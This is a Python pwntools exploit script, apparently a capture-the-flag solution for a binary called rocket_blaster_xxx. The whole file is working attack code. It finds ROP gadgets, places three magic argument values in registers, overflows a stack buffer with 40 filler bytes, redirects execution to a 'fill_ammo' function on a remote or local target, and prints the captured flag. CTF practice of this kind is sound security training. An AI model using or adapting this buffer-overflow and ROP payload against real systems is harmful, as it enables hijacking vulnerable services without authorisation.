#!/usr/bin/env python3


from pwn import *

context.arch = "amd64"

def exploit(io, elf):
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
    pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
    ret = rop.find_gadget(["ret"])[0] 
    fill_ammo = elf.symbols["fill_ammo"]
    
    rop_chain = flat(pop_rdi, 0xdeadbeef,
                     pop_rsi, 0xdeadbabe,
                     pop_rdx, 0xdead1337,
                     ret,
                     fill_ammo)

    payload = b"A"*40 + rop_chain
    io.sendafter(b">> ", payload)

    io.recvuntil(b"at: ")
    flag = io.recvline().decode()
    print(flag)


def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./rocket_blaster_xxx")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    elf = ELF("./rocket_blaster_xxx")
    exploit(io, elf)


if __name__ == "__main__":
    main()
